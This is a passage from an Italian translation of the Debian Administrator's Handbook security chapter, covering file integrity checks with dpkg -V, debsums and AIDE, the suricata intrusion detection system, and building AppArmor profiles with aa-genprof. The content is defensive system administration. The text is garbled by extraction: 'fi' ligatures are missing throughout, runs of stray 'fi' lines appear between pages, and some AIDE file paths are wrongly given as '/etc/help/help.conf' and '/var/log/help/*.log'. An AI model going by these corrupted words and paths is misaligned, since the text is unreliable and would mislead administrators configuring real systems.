                                 comunemente monitorati: carico del processore, traf co di rete, richieste (o
                                 accessi) di pagine web, ecc.
                                 I pacchetti mrtg-contrib e mrtgutils offrono degli scripts di esempio, che potrete
                                 utilizzare direttamente.

14.3.3. Rilevamento delle modi che

Completata l’installazione del sistema e la sua con gurazione, bloccati gli aggiornamenti di sicurezza
automatici, non c’è ragione per cui lo stato della maggior parte dei les e delle directories dovrebbe
cambiare, fatta eccezione per i dati. Quindi potrebbe essere utile accertarsi che nessun le sia
effettivamente cambiato, dato che eventuali modi che impreviste sono da ritenersi sospette. In
questo paragrafo sono presentati degli strumenti idonei per monitorare i les e noti care agli
amministratori eventuali cambiamenti non previsti (o semplicemente per elencarli in una lista).

                                                                TDAH_1.0         Capitolo XIV - Sicurezza Pagina 385
   fi
             fi
                  fi
                       fl
                            fi
                            fi
                                              fi
                                                   fi
                                                        fi
                                                                    fi
                                                                            fi
                                                                                     fi
                                                                                          fi
                                                                                               fi
                                                                                                    fi
                    [È consigliabile anche la lettura del paragrafo 6.5 “Veri ca dell'autenticità del pacchetto” a pag. 121]

                    14.3.3.1 La validazione dei pacchetti tramite il comando dpkg --verify

                            ANDANDO                                     dpkg --verify può essere utilizzato per rilevare le modi che apportate ad un le
                               OLTRE                                    da un pacchetto Debian, ma è inutile se lo stesso pacchetto Debian è stato alterato,
                                                                        ad esempio compromettendo il mirror Debian. Per proteggervi da questo tipo di
                     Come proteggersi
                                                                        attacchi dovrete utilizzare il sistema di veri ca della rma digitale integrato in APT
                     dalle modi che a                                   (andate a leggere il paragrafo 6.5, “Veri ca dell'autenticità del pacchetto” a pagina
                     monte                                              121) ed installare esclusivamente i pacchetti con origine certi cata.

                    dpkg --verify (o dpkg -V) è uno strumento che consente di scovare i les installati e modi cati
                    (potenzialmente da un malintenzionato), ma non è consigliabile darsi ciecamente. Difatti dpkg per
                    eseguire la suddetta attività si af da ai checksums conservati nel suo stesso database, a sua volta
                    memorizzato nel disco rigido (nel le /var/lib/dpkg/info/package.md5sums); un
                    malintenzionato abile potrebbe aggiornare i les [del database] in modo che includano i checksums
                    dei les compromessi.

                            BASILARE                                    Un breve promemoria: un’impronta digitale è un valore, solitamente numerico
                                                                        (sebbene esadecimale), che costituisce una sorta di rma del contenuto di un le. La
                     Fingerprint                                          rma viene elaborata attraverso un algoritmo (MD5 e SHA1 sono esempi noti) e
                     (impronta                                          garantisce più o meno il rilevamento di eventuali modi che del le, anche se
                     digitale) di un le                                 irrilevanti, dato che ciascuna modi ca del le altera l'impronta digitale; il suddetto
                                                                        effetto viene denominato “avalanche effect” (“effetto valanga”). Ed è proprio questo
                                                                        effetto a consentire ad un semplice ngerprint numerico di essere il test decisivo
                                                                        per veri care se il contenuto di un le è stato alterato. Gli algoritmi non sono
                                                                        reversibili; ciò signi ca che pur conoscendo l’impronta digitale non è possibile
                                                                        ricostruire i corrispondenti contenuti. In realtà recenti studi hanno invalidato
                                                                        l’assolutezza (o inviolabilità) dei suddetti principi, ciò nonostante il loro impiego è
                                                                        ancora indiscusso, dato che tutt’oggi la creazione di diversi contenuti che
                                                                        corrispondono alla stessa impronta digitale è ancora un’attività complessa.

                    Il comando dpkg -V esegue il controllo di tutti i pacchetti installati e riporta ogni le
                    che non supera il test di integrità riga per riga. Il formato output è lo stesso di rpm -V, ma in
                    quest’ultimo ogni carattere corrisponde ad un test per uno speci co metadata. Sfortunatamente,
                    dpkg non include i metadati necessari per eseguire più tests e pertanto si limiterà a visualizzare solo
                    punti interrogativi. Al momento viene segnalato soltanto il fallimento della veri ca del checksum
                    attraverso un "5" come terzo carattere.

                    # dpkg -V
                    ??5??????   /lib/systemd/system/ssh.service
                    ??5?????? c /etc/libvirt/qemu/networks/default.xml
                    ??5?????? c /etc/lvm/lvm.conf
                    ??5?????? c /etc/salt/roster

                    Nell'esempio soprastante, dpkg riporta una modi ca del le service di SSH effettuata
                    impropriamente dall’amministratore direttamente nel le del pacchetto; diversamente
                    l’amministratore avrebbe dovuto eseguire un appropriato override (sostituzione) attraverso il le /
                    etc/systemd/system/ssh.service ( le che dovrebbe essere salvato in /etc come qualsiasi altra
                    con gurazione personalizzata).
                    dpkg ha elencato inoltre diversi les di con gurazione (identi cati dalla lettera "c" nel secondo
                    campo) che sono stati legittimamente modi cati.

                    Pagina 386 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
     fi
     fi
          fi
               fi
                      fi
                           fi
                                          fi
                                          fi
                                               fi
                                                    fi
                                                         fi
                                                              fi
                                                                   fi
                                                                          fi
                                                                               fi
                                                                               fi
                                                                                    fi
                                                                                         fi
                                                                                              fi
                                                                                                   fi
                                                                                                        fi
                                                                                                             fi
                                                                                                                  fi
                                                                                                                       fi
                                                                                                                            fi
                                                                                                                            fi
                                                                                                                                 fi
                                                                                                                                      fi
                                                                                                                                           fi
                                                                                                                                                fi
                                                                                                                                                     fi
                                                                                                                                                      fi
                                                                                                                                                           fi
                                                                                                                                                                fi
                                                                                                                                                                fi
                                                                                                                                                                     fi
                                                                                                                                                                          fi
                                                                                                                                                                               fi
                                                                                                                                                                                    fi
          14.3.3.2 Veri ca dei pacchetti con debsums nonostante i suoi limiti

          debsums è l'antenato di dpkg -V, che lo ha reso quasi obsoleto. debsums presenta gli stessi limiti di
          dpkg. Fortunatamente è possibile aggirare tali limiti attraverso dei work-arounds (cosa che dpkg
          non consente di fare).
          Dato che i dati sul disco non possono essere accertati, debsums effettua i suoi controlli basandosi sui
           le .deb e non sul database di dpkg. Per scaricare les .deb af dabili di tutti i pacchetti installati
          dovrete effettuare il download autenticato di APT. Questa operazione potrebbe essere lunga e
          tediosa, pertanto non è consigliabile includerla come misura proattiva da impiegare ripetutamente.

          # apt-get --reinstall -d install ‘grep-status -e ’Status: install ok installed’ -n -s
          -> Package‘
          [ ... ]
          # debsums -p /var/cache/apt/archives --generate=all

          Si precisa che nel soprastante esempio è stato utilizzato il comando grep-status incluso nel
          pacchetto dctrl-tools, che non è installato di default.

          14.3.3.3 Monitoraggio dei les: AIDE

          AIDE (Advanced Intrusion Detection Environment) è uno strumento utilizzato per: veri care
          l'integrità dei les; rilevare eventuali modi che rispetto ad un'immagine del sistema (af dabile)
          precedentemente salvata.
          L’immagine viene memorizzata sotto forma di database (/var/lib/aide/aide.db) ed include tutte
          le informazioni rilevanti di tutti i les presenti nel sistema ( ngerprints, permessi, timestamps,
          ecc.). Il database viene inizializzato per la prima volta da aideinit; dopodiché viene utilizzato
          quotidianamente (attraverso lo script /etc/cron.daily/aide) per veri care che non sono presenti
          modi che sospette. Se vengono rilevate delle modi che, AIDE le salva in un log le (/var/log/
          help/*.log) e ne invia i risultati all'amministratore via email.

                IN PRATICA                    Dato che AIDE utilizza un database locale per veri care lo stato dei les, la validità
                                              dei risultati dell’accertamento di AIDE è direttamente “dipendente” dalla validità
           Protezione del
                                              del database locale. Se un malintenzionato riesce ad ottenere l’accesso al sistema
           database                           come root sarà in grado anche di sostituire il database e di coprire le sue tracce.
                                              Pertanto è consigliabile memorizzare il database “di riferimento” su un supporto di
                                              memorizzazione read-only (solo leggibile).

          Il funzionamento del pacchetto aide può essere modi cato grazie a diverse opzioni in /etc/
          default/help. La con gurazione di AIDE si trova in /etc/help/help.conf e /etc/aide/
          aide.conf.d/ (di fatto, questi les vengono impiegati da update-aide.conf
          per generare /var/lib/aide/aide.conf.autogenerated). La con gurazione individua quali
          proprietà dei les devono essere controllate. Ad esempio, il contenuto dei log le cambia
          ripetutamente pertanto tali cambiamenti possono essere ignorati a patto che i permessi correlati
          non siano stati modi cati, ma il contenuto ed i permessi dei programmi eseguibili devono rimanere
          inalterati. Sebbene la sintassi della con gurazione non sia complessa, rimane comunque poco
          intuitiva, di conseguenza la lettura della man page di aide.conf(5) è raccomandata.

          Ogni giorno viene generata una nuova versione del database in /var/lib/aide/aide.
          db.new; se tutti i cambiamenti registrati sono attendibili potrete utilizzare il correlato database per
          sostituire il corrente database di riferimento.

                                                                                          TDAH_1.0      Capitolo XIV - Sicurezza Pagina 387
fi
     fi
           fi
             fi
                fi
                     fi
                          fi
                               fi
                                    fi
                                         fi
                                                 fi
                                                      fi
                                                           fi
                                                                fi
                                                                 fi
                                                                      fi
                                                                           fi
                                                                                fi
                                                                                     fi
                                                                                              fi
                                                                                                   fi
                                                                                                         fi
                                                                                                              fi
                                                                                                                   fi
                                                                                                                        fi
                                Tripwire è simile ad AIDE; la sintassi del suo le di con gurazione è per lo più la
        ALTERNATIVA
                                stessa di AIDE. Ma tripwire consente inoltre di rmare il le di con gurazione in
      Tripwire e                modo che un malintenzionato non possa modi carlo af nché utilizzi una versione
      Samhain                   alterata del database di riferimento.
                                Anche Samhain offre funzionalità simili ad AIDE, ma include in aggiunta la
                                possibilità di rilevare la presenza di rootkit (per maggiori informazioni consultare
                                la casella di testo "I pacchetti checksecurity e chkrootkit/rkhunter” a pagina 388).
                                Inoltre, consente il suo deployment su un'intera rete e registra i suoi tracciamenti
                                su un server centrale (con rma).

                                Il pacchetto checksecurity include diversi scripts di piccole dimensioni che
                 BREVE
                                mettono in esecuzione i controlli base sul sistema (password assenti, creazione di
             ACCENNO            nuovi les con permessi setuid, ecc.) e gli eventuali avvisi all’amministratore se il
      I pacchetti               caso lo richiede. Si precisa però che un amministratore non dovrebbe basare la
      checksecurity             sicurezza di un sistema Linux esclusivamente sul suddetto pacchetto, nonostante il
      e chkrootkit/             suo nome.
      rkhunter                  I pacchetti chkrootkit e rkhunter scansionano il sistema onde scongiurare la
                                presenza di rootkit. Ma i rootkit sono componenti software progettati per prendere
                                il controllo del sistema celando le loro tracce. Pertanto le veri che dei suddetti
                                pacchetti non sono infallibili al 100%, ma quanto meno richiamano l’attenzione
                                dell’amministratore qualora ci fossero potenziali anomalie.

     14.3.4. Intrusion Detection System / Network Detection System (IDS/NIDS)

             BASILARE           Un attacco “denial of service” ha il solo scopo di rendere un servizio inutilizzabile.
                                Viene implementato in diversi modi, sovraccaricando il server con queries o
      Denial of service
                                attraverso l’exploit di un bug, ma il risultato è sempre lo stesso: il servizio in
                                questione diventa inservibile. Così facendo gli utenti, consumatori del servizio
                                erogato dal provider, rimangono scontenti ed il fornitore dei servizi subisce un
                                danno di reputazione (con effetti sul fatturato, specialmente se si tratta di un sito e-
                                commerce).
                                Un attacco “denial of service” a volte viene "distribuito", sovraccaricando il server
                                attraverso diverse queries provenienti da più sorgenti, in modo che il server non
                                possa più rispondere alle richieste legittime. Gli attacchi “denial of service” hanno
                                un loro acronimo in inglese: DoS o DDoS (se distribuito).

     suricata (disponibile attraverso l'omonimo pacchetto Debian) è uno strumento di rilevamento delle
     intrusioni di rete (NIDS — Network Intrusion Detection System). Si mette in ricezione della rete
     per rilevare i tentativi di intrusione e/o atti ostili (come attacchi “denial of service”). Tutti gli eventi
     vengono registrati in diversi log les archiviati in /var/log/suricata. Strumenti di terze parti
     (Kibana/Logstash) consentono una migliore consultazione dei dati raccolti.

       http://suricata-ids.org
       https://www.elastic.co/products/kibana

     Pagina 388 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
                  fi
                           fi
                                     fi
                                          fi
                                               fi
                                                    fi
                                                    fi
                                                         fi
                                                              fi
                                                                   fi
                   ATTENZIONE                           L’ef cacia di suricata si limita al traf co che monitora attraverso l’interfaccia di
                Campo di azione                         rete. Difatti suricata rileva ciò che avviene nella rete (effettiva) soltanto se in
                                                        condizione di porsi in ricezione di quest’ultima. Ad esempio se connesso
                                                        genericamente ad uno switch di rete, suricata non riesce a raggiungere il ne per
                                                        cui è stato installato, monitorando soltanto gli attacchi mirati alla macchina che lo
                                                        ospita. Pertanto dovrete collegare la macchina che ospita suricata al port destinato
                                                        al port mirroring dello switch [che consente di catturare una copia dei pacchetti
                                                        di rete], in questo modo se sono presenti più switch connessi fra loro in chaining
                                                        suricata è in grado di monitorare l’intero traf co di rete.

               La con gurazione di Suricata avviene tramite la revisione e la personalizzazione del le /etc/
               suricata/suricata-debian.yaml, che è piuttosto prolisso dato che ciascun parametro è
               abbondantemente commentato. La con gurazione minima richiede che venga de nito l'intervallo di
               indirizzi della rete locale (il parametro HOME_NET). In pratica, l'insieme di tutti i potenziali bersagli
               di un attacco. Ma una con gurazione adeguata necessità una lettura approfondita del sopracitato le
               allo scopo di modi carlo in base al contesto locale.

               Dovrete anche modi care /etc/default/suricata per individuare l'interfaccia di rete da
               monitorare ed abilitare lo script init (impostando RUN=yes). È consigliabile inoltre impostare
               LISTENMODE=pcap, visto che la modalità prede nita LISTENMODE=nfqueue richiede un’ulteriore
               con gurazione (ossia il rewall netfilter deve essere con gurato in modo che trasmetta i
               pacchetti ad una “user-space queue” gestita da suricata tramite NFQUEUE).

               suricata per rilevare funzionalità anomale necessita anche di un ruleset di supervisione
               disponibile nel pacchetto snort-rules-default. snort difatti è uno strumento storico di
               riferimento per quel che concerne il rilevamento delle intrusioni (IDS — Intrusion Detection
               System) e suricata può sfruttare le sue regole. Purtroppo il pacchetto di snort non è più disponibile
               in Debian Jessie e dovrete recuperarlo da un’altra release di Debian come Testing o Unstable.
               Un'altra alternativa è oinkmaster (disponibile nel pacchetto omonimo), in grado di scaricare il
               ruleset di Snort da sorgenti esterne.

                       ANDANDO                          Prelude offre un monitoraggio centralizzato delle informazioni di sicurezza. La sua
                                                        struttura modulare include un server (svolge le funzioni di manager ed è incluso nel
                          OLTRE
                                                        pacchetto prelude-manager) che archivia gli avvisi rilevati e trasmessi dai
                Integrazione con
                                                        sensors di vario tipo.
                prelude                                 Suricata può essere con gurato per svolgere la funzione di sensor. In alternativa
                                                        potrete fare riferimento a prelude-lml (Log Monitor Lackey) che si occupa del
                                                        monitoraggio dei log les (come logcheck già descritto nel paragrafo 14.3.1,
                                                        “Monitoraggio dei logs con logcheck” pag. 383).

               14.4. Introduzione ad AppArmor

               14.4.1. I principi

               AppArmor è un Mandatory Access Control (MAC) [trad. lett. sistema controllo accessi] che si basa
               sull’interfaccia Linux LMS (Linux Security Modules). In pratica il kernel richiede ad AppArmor
               prima di rispondere a qualsiasi chiamata di sistema [il meccanismo attraverso cui un’applicazione
               richiede un servizio al kernel] se il processo coinvolto è autorizzato ad ottenere l’implementazione
               dell'operazione in questione. Attraverso questo meccanismo AppArmor limita una serie di risorse ai
               programmi.

               AppArmor applica una serie di regole (denominate "profile") a ciascun programma. Il pro lo a sua
               volta, messo in atto dal kernel, dipende dal percorso di installazione del programma da eseguire.

                                                                                       TDAH_1.0      Capitolo XIV - Sicurezza Pagina 389
fi
     fi
          fi
                     fi
                          fi
                               fi
                                    fi
                                         fi
                                              fi
                                                   fi
                                                           fi
                                                                fi
                                                                     fi
                                                                                  fi
                                                                                          fi
                                                                                                          fi
                                                                                                               fi
                                                                                                                       fi
                                                                                                                              fi
          Difatti contrariamente a SELinux (descritto nel paragrafo 14.5, “Introduzione a SELinux” a pagina
          397) le regole di AppArmor non dipendono dall'utente. Di conseguenza tutti gli utenti dovranno
          attenersi alle stesse regole quando utilizzano lo stesso programma (tenuto ovviamente presente che
          anche i permessi utente potrebbero avere un effetto con risultati diversi sul funzionamento del
          programma in questione!).

          I pro li di AppArmor vengono salvati in /etc/apparmor.d/ e consistono in un elenco di regole sul
          controllo accesso alle risorse a cui ciascun programma deve attenersi. I pro li sono compilati e
          caricati nel kernel attraverso il comando apparmor_parser. Ciascun pro lo può essere caricato in
          modalità enforcing (rigida) o in modalità complaining (reclamo). La modalità enforcing impone
          il rispetto della politica di sicurezza e segnala i tentativi di violazione, mentre la modalità
          complaining si limita a creare dei logs per le chiamate di sistema che in teoria dovrebbero essere
          negate, ma che in pratica vengono comunque implementate.

          14.4.2. Come attivare AppArmor e gestire i pro li AppArmor

          Il supporto di AppArmor è integrato nei kernels prede niti offerti da Debian. Per attivare
          AppArmor, dovrete installare dei pacchetti ed aggiungere alcuni parametri da riga di comando al
          kernel [Per maggiori informazioni sulla kernel command line consultare http://kernel.org o la man
          page kernel command line(7)]:

          # apt install apparmor apparmor-profiles apparmor-utils
          [...]
          # perl -pi -e ’s,GRUB_CMDLINE_LINUX=”(.*)”$,GRUB_CMDLINE_LINUX=”$1 apparmor=1
          -> security=apparmor”,’ /etc/default/grub
          # update-grub

          Dopo un riavvio AppArmor sarà operativo ed il comando aa-status lo confermerà:

          # aa-status
          apparmor module is loaded.
          44 profiles are loaded.
          9 profiles are in enforce mode.
            /usr/bin/lxc-start
            /usr/lib/chromium-browser/chromium-browser//browser_java
          [...]
          35 profiles are in complain mode.
            /sbin/klogd
          [...]
          3 processes have profiles defined.
          1 processes are in enforce mode.
            /usr/sbin/libvirtd (1295)
          2 processes are in complain mode.
            /usr/sbin/avahi-daemon (941)
            /usr/sbin/avahi-daemon (1000)
          0 processes are unconfined but have a profile defined.

                         NOTA        Il pacchetto apparmor-profiles include i pro li sviluppati dalla comunità
           Come ottenere             upstream di AppArmor. Se desiderate altri pro li potrete installare apparmor-
           altri pro li da           profiles-extra, che contiene i pro li sviluppati da Ubuntu e Debian.
           AppArmor

          Pagina 390 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
     fi
                                fi
                                           fi
                                           fi
                                                   fi
                                                        fi
                                                                             fi
                                                                                  fi
     Potrete cambiare lo stato di ciascun pro lo in modalità enforcing (rigida) o in modalità
     complaining (reclamo) attraverso i comandi aa-enforce e aa-complain, inserendo come
     parametri il percorso dell'eseguibile o del policy le. Allo stesso modo potrete disabilitare
     completamente un pro lo con aa-disable oppure convertirlo in modalità audit [valutazione-
     controllo] (in modo che vengano registrati nei logs anche le chiamate di sistema autorizzate) con
     aa-audit.

     # aa-enforce /usr/sbin/avahi-daemon
     Setting /usr/sbin/avahi-daemon to enforce mode.
     # aa-complain /etc/apparmor.d/usr.bin.lxc-start
     Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.

     14.4.3. Come creare un nuovo pro lo

     Sebbene sia abbastanza semplice creare un pro lo AppArmor, la maggior parte dei programmi non
     offre un pro lo nativamente.
     Questo paragrafo vi metterà in condizioni di creare un nuovo pro lo da zero, semplicemente
     mettendo in esecuzione il programma bersaglio in modo che AppArmor possa monitorare le sue
     chiamate di sistema ed istruirsi riguardo alle risorse che utilizza.

     I programmi che dovranno essere monitorati e limitati (in gergo di AppArmor “con nati”)
     nell’utilizzo delle risorse sono quelli che si connettono alla rete o che sono notoriamente oggetto di
     attacchi. AppArmor a tale scopo dispone del comando aa-unconfined, che elenca i programmi privi
     di un pro lo associato e che sono esposti ad un network socket aperto [Un network socket è
     un’astrazione software in un nodo di rete, sico o software, che funge da endpoint per la ricezione e
     la trasmissione dei dati nella rete]. L'opzione --paranoid elenca tutti i processi non con nati che
     hanno almeno una connessione di rete attiva.

     # aa-unconfined
     801 /sbin/dhclient not confined
     890 /sbin/rpcbind not confined
     899 /sbin/rpc.statd not confined
     929 /usr/sbin/sshd not confined
     941 /usr/sbin/avahi-daemon confined by ’/usr/sbin/avahi-daemon (complain)’
     988 /usr/sbin/minissdpd not confined
     1276 /usr/sbin/exim4 not confined
     1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
     1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
     19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined

     L'esempio seguente mostra come creare un pro lo per /sbin/dhclient. Il comando aa-genprof
     dhclient viene utilizzato a tale scopo. La risposta del comando invita a mettere in esecuzione
     l'applicazione in questione in un'altra nestra e dopodiché di ritornare alla nestra aperta con aa-
     genprof per avviare la scansione di AppArmor degli eventi e la loro archiviazione nei logs; in ne i
     logs verranno convertiti in regole di controllo accesso. Per ciascun evento registrato da AppArmor
     aa-genprof propone uno o più regole che possono essere autorizzate o personalizzate in diversi
     modi:

     # aa-genprof dhclient
     Writing updated profile for /sbin/dhclient.
     Setting /sbin/dhclient to complain mode.

     Before you begin, you may wish to check if a
     profile already exists for the application you
     wish to confine. See the following wiki page for
     more information:

                                                          TDAH_1.0        Capitolo XIV - Sicurezza Pagina 391
fi
     fi
               fi
                            fi
                                 fi
                                      fi
                                           fi
                                                fi
                                                fi
                                                     fi
                                                          fi
                                                                     fi
                                                                                fi
                                                                                     fi
                                                                                          fi
http://wiki.apparmor.net/index.php/Profiles

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the ”Scan” option below in
order to scan the system logs for AppArmor events.

For each AppArmor event, you will be given the
opportunity to choose whether the access should be
allowed or denied.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
Reading log entries from /var/log/audit/audit.log.

Profile: /sbin/dhclient 1
Execute: /usr/lib/NetworkManager/nm-dhcp-helper
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r
➥ )t / (F)inish
P
Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

(Y)es / [(N)o]

Y
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
Complain-mode changes:
WARN: unknown capability: CAP_net_raw

Profile: /sbin/dhclient 2
Capability: net_raw
Severity: unknown

[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
A
Adding capability net_raw to profile.

Profile: /sbin/dhclient 3
Path: /etc/nsswitch.conf
Mode: r
Severity: unknown

Pagina 392 Il Manuale dell’Amministratore di Debian TDAH_1.0
1 - #include <abstractions/apache2-common>
2 - #include <abstractions/libvirt-qemu>
3 - #include <abstractions/nameservice>
4 - #include <abstractions/totem>
[5 - /etc/nsswitch.conf]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F
-> )inish / (M)ore

3

Profile: /sbin/dhclient
Path: /etc/nsswitch.conf
Mode: r
Severity: unknown
1 - #include <abstractions/apache2-common>
2 - #include <abstractions/libvirt-qemu>
[3 - #include <abstractions/nameservice>]
4 - #include <abstractions/totem>
5 - /etc/nsswitch.conf
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F
-> )inish / (M)ore

A
Adding #include <abstractions/nameservice> to profile.

Profile: /sbin/dhclient
Path: /proc/7252/net/dev
Mode: r
Severity: 6
1 - /proc/7252/net/dev
[2 - /proc/*/net/dev]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F
-> )inish / (M)ore

A
Adding /proc/*/net/dev r to profile

[...]
Profile: /sbin/dhclient 4
Path: /run/dhclient-eth0.pid
Mode: w
Severity: unknown

[1 - /run/dhclient-eth0.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F
-> )inish / (M)ore

N
Enter new path: /run/dhclient*.pid

                                             TDAH_1.0    Capitolo XIV - Sicurezza Pagina 393
Profile: /sbin/dhclient
Path: /run/dhclient-eth0.pid
Mode: w
Severity: unknown
1 - /run/dhclient-eth0.pid
[2 - /run/dhclient*.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F
-> )inish / (M)ore
A
Adding /run/dhclient*.pid w to profile

[...]
Profile: /usr/lib/NetworkManager/nm-dhcp-helper 5
Path: /proc/filesystems
Mode: r
Severity: 6

[1 - /proc/filesystems]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F
-> )inish / (M)ore

A
Adding /proc/filesystems r to profile
= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

[1 - /sbin/dhclient]
2 - /usr/lib/NetworkManager/nm-dhcp-helper
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)
-> lean profiles / Abo(r)t

S
Writing updated profile for /sbin/dhclient.
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish

F
Setting /sbin/dhclient to enforce mode.
Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.

Reloaded AppArmor profiles in enforce mode.

Please consider contributing your new profile!
See the following wiki page for more information:
http://wiki.apparmor.net/index.php/Profiles

Pagina 394 Il Manuale dell’Amministratore di Debian TDAH_1.0
          Finished generating profile for /sbin/dhclient.

          Si precisa che il programma non visualizza i caratteri di controllo che immetterete in risposta alle
          sue richieste; i caratteri di controllo sono stati trascritti nell’esempio precedente solo per una
          maggiore comprensione degli argomenti trattati.

          1 Il primo evento rilevato è l'esecuzione di un altro programma. In questo caso avrete a disposizione
          diverse scelte ossia potrete eseguire il programma con: il pro lo del parent process (l’opzione
          “Inherit”); un pro lo dedicato, attraverso l’opzione “Pro le” oppure attraverso l’opzione “Named” (se
          desiderate assegnare un nome); un sottopro lo del parent process (l’opzione “Child”); senza alcun
          pro lo (l’opzione “Uncon ned”); in alternativa potrete negare l’esecuzione del programma
          (l’opzione“Deny”).
          Occorre far presente che se avvierete il processo optando per un pro lo dedicato inesistente, il tool
          ne creerà uno nuovo suggerendovi le regole da includere durante la sua stessa creazione.

          2 A livello di kernel, i diritti speciali dell'utente root vengono suddivisi in “capabilities”. Se una
          chiamata di sistema richiede una capacità speci ca, AppArmor veri cherà il pro lo e se il
          programma è autorizzato ad utilizzare la suddetta capacità.

          3 Il programma richiede i permessi di lettura di /etc/nsswitch.conf. aa-genprof in questo caso
          ha rilevato che i permessi di lettura del le in questione sono garantiti da diverse “astrazioni” e li
          suggerisce come scelte alternative. Un'astrazione offre un insieme di regole di controllo accessi
          inerenti a diverse risorse che notoriamente vengono impiegate insieme.
          Nel caso speci co, il sopracitato le è accessibile tramite le funzioni (relative al nameservice) della
          libreria C; nell’esempio è stata scelta la terza astrazione disponibile nell’elenco suggerito
          (immettendo il carattere 3) "#include <abstractions/nameservice>"; dopodiché è stata scelta
          l’opzione "A" per autorizzare.

          4 Il programma richiede di poter creare il le /run/dhclient-eth0.pid. La creazione di questo le
          (essendo troppo speci co) impedirebbe al programma di funzionare con un’interfaccia di rete
          diversa da eth0. Quindi nell’esempio è stato scelto "New" per cambiare il nome del le e renderlo più
          generico, "/run/dhclient*.pid"e dopo è stata salvata la regola con "Allow".

          5 Occorre precisare che la presente richiesta di accesso non fa parte del pro lo dhclient, ma del
          nuovo pro lo creato (al punto 1) /usr/lib/NetworkManager/nm-dhcp-helper.
          Il programma, dopo aver monitorato e registrato tutti gli eventi, propone di salvare tutti i pro li
          creati durante l’esecuzione. Nell’esempio i pro li da salvare sono due (anche se è possibile salvarli
          individualmente); di conseguenza viene scelta l’opzione “Save” e poi l’opzione “Finish” per uscire dal
          programma.

          aa-genprof è di fatto un wrapper di aa-logprof (uno strumento che aggiorna la modalità di
          applicazione della politica di sicurezza associata ad un pro lo): aa-genprof realizza un pro lo
          vuoto, lo carica in modalità compliant ed esegue poi aa-logprof per aggiornare la modalità di

                                                                                TDAH_1.0          Capitolo XIV - Sicurezza Pagina 395
fi
     fi
            fi
                 fi
                      fi
                           fi
                                fi
                                        fi
                                             fi
                                                  fi
                                                       fi
                                                            fi
                                                                 fi
                                                                      fi
                                                                           fi
                                                                                   fi
                                                                                        fi
                                                                                             fi
                                                                                                      fi
                                                                                                           fi
                                                                                                                 fi
                                                                                                                      fi
                                                                                                                           fi
applicazione della politica di sicurezza del pro lo precedentemente registrata. Potrete in ogni caso
eseguire successivamente aa-logprof per migliorare un pro lo creato.

Per generare un pro lo completo è consigliabile eseguire il programma bersaglio in tutti i modi
possibili. Nel caso di dhclient, ciò comporta la sua esecuzione tramite Network Manager, ifupdown,
manualmente, ecc. Alla ne, otterrete un le /etc/apparmor.d/sbin.dhclient simile al seguente:

# Last Modified: Tue Sep 8 21:40:02 2015
#include <tunables/global>

/sbin/dhclient {
  #include <abstractions/base>
  #include <abstractions/nameservice>

    capability net_bind_service,
    capability net_raw,

    /bin/dash r,
    /etc/dhcp/* r,
    /etc/dhcp/dhclient-enter-hooks.d/* r,
    /etc/dhcp/dhclient-exit-hooks.d/* r,
    /etc/resolv.conf.* w,
    /etc/samba/dhcp.conf.* w,
    /proc/*/net/dev r,
    /proc/filesystems r,
    /run/dhclient*.pid w,
    /sbin/dhclient mr,
    /sbin/dhclient-script rCx,
    /usr/lib/NetworkManager/nm-dhcp-helper Px,
    /var/lib/NetworkManager/* r,
    /var/lib/NetworkManager/*.lease rw,
    /var/lib/dhcp/*.leases rw,
    profile /sbin/dhclient-script flags=(complain) {
      #include <abstractions/base>
      #include <abstractions/bash>

        /bin/dash rix,
        /etc/dhcp/dhclient-enter-hooks.d/* r,
        /etc/dhcp/dhclient-exit-hooks.d/* r,
        /sbin/dhclient-script r,

    }
}

Pagina 396 Il Manuale dell’Amministratore di Debian TDAH_1.0
          fi
               fi
                              fi
                                   fi
                                                  fi
     14.5. Introduzione a SELinux

     14.5.1. I principi

     SELinux (Security Enhanced Linux) è un Mandatory Access Control (MAC) [trad. lett. sistema
     controllo accessi] che si basa sull’interfaccia Linux LMS (Linux Security Modules). In pratica il
     kernel richiede ad SELinux prima di rispondere a qualsiasi chiamata di sistema [il meccanismo
     attraverso cui un’applicazione richiede un servizio al kernel] se il processo coinvolto è autorizzato
     ad ottenere l’implementazione dell'operazione in questione.

     SELinux, per poter autorizzare o negare un’operazione, impiega un insieme di regole denominate
     collettivamente policy. Le regole in sé sono complesse da realizzare. Fortunatamente due set di
     regole standard (targeted e strict) sono offerte da SELinux per far risparmiare gran parte della
     con gurazione.

     Il sistema dei permessi di SELinux è totalmente diverso da quello supportato da un sistema Unix
     tradizionale. Le autorizzazioni di un processo dipendono dal suo security context (contesto di
     sicurezza). Il contesto è de nito attraverso l’identity (identità) dell’utente che ha avviato il
